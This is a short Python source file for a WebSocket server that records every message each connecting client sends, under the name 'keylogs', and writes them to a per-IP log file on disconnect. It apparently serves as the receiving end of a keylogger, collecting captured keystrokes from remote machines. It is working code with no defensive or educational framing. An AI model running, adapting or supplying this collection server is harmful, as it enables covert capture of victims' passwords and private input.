from SimpleWebSocketServer import SimpleWebSocketServer, WebSocket
import json
    
keylogs = json.loads('{}')

class SocketServer(WebSocket):
    def handleMessage(self):
        clientKeylogs = keylogs[str(self.address[0]) + "-" + str(self.address[1])]
        clientKeylogs.append(self.data)
        keylogs[str(self.address[0]) + "-" + str(self.address[1])] = clientKeylogs

    def handleConnected(self):
        print(self.address, 'connected')
        keylogs[str(self.address[0]) + "-" + str(self.address[1])] = []


    def handleClose(self):
        print(self.address, 'closed')
        cleanAdress = [
            str(self.address[0]).replace("/", "").replace("\\", "").replace("?", "")
                            .replace("*", "").replace(":", "").replace(">", "")
                            .replace("<", "").replace("|", ""),
            str(self.address[1]).replace("/", "").replace("\\", "").replace("?", "")
                            .replace("*", "").replace(":", "").replace(">", "")
                            .replace("<", "").replace("|", "")
        ]

        file = open("./logserver/" + cleanAdress[0] + "-" + cleanAdress[1] + ".log.txt", "w")
        clientKeylogs = keylogs[str(self.address[0]) + "-" + str(self.address[1])]

        for key in clientKeylogs:
            file.write(key + ", ")

        file.close()

server = SimpleWebSocketServer('', 3000, SocketServer)
server.serveforever()